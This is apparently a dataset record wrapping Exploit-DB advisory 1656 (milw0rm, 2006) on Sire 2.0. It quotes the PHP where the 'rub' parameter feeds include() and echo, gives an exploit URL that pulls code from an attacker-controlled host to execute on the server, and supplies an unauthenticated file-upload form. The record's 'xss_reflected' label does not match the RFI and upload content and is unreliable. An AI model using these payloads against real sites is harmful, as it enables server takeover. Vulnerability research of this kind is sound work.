{
  "id": "1656",
  "title": "Sire 2.0 - &#039;/lire.php&#039; Remote File Inclusion / Arbitrary File Upload",
  "cve": null,
  "vuln_type": "xss_reflected",
  "code": "[+]File Inclusion:\r\n       Input passed to the \"rub\" parameter in \"lire.php\" isn't properly verified,\r\n       before it is used to include remote files\r\n       Successful exploitation requires that \"register_globals\" is enabled.\r\n\r\n[lire.php code]\r\n<?\r\n       73              if(empty($_GET[\"rub\"])){$rub=rtrim($rubriques[0]);} else {$rub=$_GET[\"rub\"];}\r\n       75              include($rub.\"/compter.php\"); ## File Inclusion !!\r\n\r\n       298             echo $rub; ## XSS\r\n?>\r\n\r\n[+]Exploit: Exploit http://[trajet]/lire.php?rub=http://[attacker]&cahier=1&art=1\r\n[+]http://[attacker]/compter.php Will be Included And Executed withe the privilege of the webserver\r\n\r\n\r\nFile Upload\r\nRemote User can Upload jpg,jpeg,gif,bmp files without Identification ,\r\n[upload.php code:]\r\n<?\r\nif( isset($_POST['upload']) ) // si formulaire soumis\r\n{\r\n#Upload code ....\r\n}\r\n?>\r\nExploit :\r\n\r\n<form enctype=\"multipart/form-data\" method=\"post\" action=\"http://Trajet/upload.php?\">\r\nDownload File<br>\r\n<input name=\"fichier\" type=\"file\" size=\"48\"><br>\r\n<input type=\"submit\" name=\"upload\" value=\"uploader\"><form>\r\n\r\n[Moroccan Security Team]\r\n\r\ncontact:\r\nsimo64[at]gmail[dot]com\r\n\r\n# milw0rm.com [2006-04-09]",
  "url": "https://www.exploit-db.com/exploits/1656"
}